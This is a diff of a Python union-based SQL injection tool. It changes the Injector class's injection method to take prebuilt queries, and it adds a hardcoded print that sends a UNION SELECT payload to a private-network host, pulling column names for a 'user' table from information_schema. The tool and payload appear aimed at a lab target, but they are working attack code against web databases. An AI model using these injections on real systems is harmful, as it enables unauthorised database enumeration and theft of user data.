@@ -2,10 +2,7 @@
 """ Used for basic union-based SQL injection.
 
 """
-from BeautifulSoup import BeautifulSoup    
-import os, sys, urllib2
-import operator
-import json
+import os, sys
 import builder, scanner
 import re
 from collections import Counter
@@ -77,22 +74,19 @@ class Injector:
         return Counter(nums).most_common(1)[0][0]
         
     
-    def injection(self, page, params):
+    def injection(self, page, queries):
         """ Takes page to fuzz for injections and params to check for.
             :returns: dict of lists, keys are injected strings, values are results.
         """
-        build = builder.Builder(page, params)
-        columns = self.get_num_columns(page)
         default_page = self.scan.page(page)
         data = {}
-        magic_number = int(self.get_visible_param(page))
 
-        queries = build.union(columns, magic_number)
-        # turn into decorator and pass specific build function?
-        #queries = build.schema_union(columns, magic_number)
 
         for query in queries:
             data[query] = (self.html_diff(default_page, self.scan.page(queries[query])))
+
+        #print queries['user table']
+        print (self.html_diff(default_page, self.scan.page("http://192.168.83.134/?id=null%20%20UNION%20SELECT%201,%202,%203,%204,%205,%206,%20column_name%20from%20information_schema.columns%20where%20table_name%20=%20'user'")))
 
         return data
     
